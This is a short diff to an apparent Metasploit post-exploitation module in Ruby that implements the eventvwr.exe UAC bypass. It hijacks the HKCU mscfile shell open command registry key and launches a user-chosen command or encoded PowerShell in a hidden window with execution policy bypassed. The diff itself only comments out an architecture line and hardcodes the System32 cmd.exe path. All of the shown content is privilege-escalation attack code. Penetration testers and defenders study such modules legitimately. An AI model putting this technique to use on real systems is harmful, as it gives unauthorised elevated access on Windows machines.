@@ -169,6 +169,7 @@ class MetasploitModule < Msf::Post
 def ls_stage1
 
 session = client
+# arch = client.fs.file.expand_path("%ComSpec%")
 # check target arch (to inject into powershell string)
 arch_check = client.fs.file.expand_path("%Windir%\\SysWOW64")
 if arch_check == "C:\\Windows\\SysWOW64"
@@ -181,7 +182,7 @@ end
   vul_serve = "eventvwr.exe" # vulnerable soft to be hijacked
   exec_comm = datastore['EXEC_COMMAND'] # my cmd command to execute (OR powershell shellcode)
   uac_level = "ConsentPromptBehaviorAdmin" # uac level key
-  comm_path = "%SystemRoot%\\#{arch}\\cmd.exe /c" # cmd.exe %comspec% path
+  comm_path = "%SystemRoot%\\System32\\cmd.exe /c" # cmd.exe %comspec% path
   regi_hive = "REG ADD HKCU\\Software\\Classes\\mscfile\\shell\\open\\command" # registry hive key to be hijacked
   psh_lpath = "%SystemRoot%\\#{arch}\\WindowsPowershell\\v1.0\\powershell.exe" # powershell.exe %comspec% path
   psh_comma = "#{psh_lpath} -nop -wind hidden -Exec Bypass -noni -enc" # use_powershell advanced option command
